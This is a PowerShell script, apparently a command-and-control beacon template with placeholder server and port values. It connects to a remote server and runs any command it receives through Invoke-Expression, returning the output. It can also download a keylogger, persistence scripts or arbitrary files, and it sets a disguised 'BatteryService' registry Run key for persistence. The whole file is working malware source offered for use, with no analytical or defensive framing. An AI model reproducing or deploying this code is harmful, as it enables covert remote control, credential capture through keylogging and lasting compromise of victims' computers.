while(1 -eq 1)
{
    $server = "*1"
    $port = *2

    $tcpConnection = New-Object System.Net.Sockets.TcpClient($server, $port)
    $tcpStream = $tcpConnection.GetStream()
    $reader = New-Object System.IO.StreamReader($tcpStream)
    $writer = New-Object System.IO.StreamWriter($tcpStream)
    $writer.AutoFlush = $true

    $buffer = new-object System.Byte[] 1024
    $encoding = new-object System.Text.AsciiEncoding

    $sentIni = "false"

    # loop for handling beacon initialization with server
    while($tcpConnection.Connected)
    {
        # send beacon initialization until C2 responds 
        if($sentIni -eq "false")
        {
            $writer.Write("Hello")

            # check for C2 response
            while($tcpStream.DataAvailable)
            {
                $c2Command = $reader.ReadLine()

                if($c2Command -eq "Hello")
                {
                    $sentIni = "true"
                }
            }
        }
    

        # loop for receiving C2 commands
        # wait for C2 command 
        while($tcpStream.DataAvailable)
        {
            $c2Command = $reader.Readline()

            if($c2Command -eq "shell")
            {
                *3
            }

            if($c2Command -eq ($c2Command | Select-String -pattern "command:" -CaseSensitive -SimpleMatch))
            {
                # parse protocol syntax
                $separater = ":"
                $parts = $c2Command.Split($separater)
                $oscommand = $parts[1]

                # execute command by invoking, FIX MY FORMATTING
                $commandOutput = Invoke-Expression $oscommand | Out-String -Width 100

                # send command result back to C2 over socket
                $writer.Write($commandOutput)
            }
            if($c2Command -eq ($c2Command | Select-String -pattern "install:" -CaseSensitive -SimpleMatch))
            {
                $separater = ":"
                $parts = $c2Command.Split($separater)
                $installCommand = $parts[1]

                if($installCommand -eq "keylogger")
                {
                    Invoke-WebRequest -uri http://$server/keylogger.ps1 -OutFile C:\Users\Public\logger.ps1
                    Invoke-WebRequest -uri http://$server/persistenceK.bat -Outfile C:\Users\Public\persistenceK.bat
                    
                    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v BatteryService /t REG_SZ /d "C:\Users\Public\persistenceK.bat"
                }
                elseif($installCommand -eq "persistence")
                {
                    Invoke-WebRequest -uri http://$server/Final_Beacon.ps1 -OutFile C:\Users\Public\Final_Beacon.ps1
                    Invoke-WebRequest -uri http://$server/persistenceB.bat -OutFile C:\Users\Public\persistenceB.bat

                    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v BatteryService /t REG_SZ /d "C:\Users\Public\persistenceB.bat"
                }
                if($c2Command -eq ($c2Command | Select-String -pattern "install:" -CaseSensitive -SimpleMatch))
                {
                    $separater = ":"
                    $parts = $c2Command.Split($separater)
                    $installCommand = $parts[1]

                    Invoke-WebRequest -uri http://$server/$installCommand -OutFile C:\Users\Public\$installCommand

                }
            }
        }
    }
}

